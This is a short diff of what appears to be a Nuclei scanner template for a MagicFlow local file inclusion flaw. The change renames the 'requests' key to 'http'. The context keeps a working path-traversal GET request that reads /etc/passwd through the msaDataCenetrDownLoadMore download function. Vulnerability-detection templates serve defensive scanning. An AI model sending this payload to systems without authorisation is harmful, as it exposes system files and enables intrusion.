@@ -8,7 +8,7 @@ info:
   reference: https://www.seebug.org/vuldb/ssvid-89258
   tags: magicflow,lfi
 
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/msa/main.xp?Fun=msaDataCenetrDownLoadMore+delflag=1+downLoadFileName=msagroup.txt+downLoadFile=../../../../../../etc/passwd"
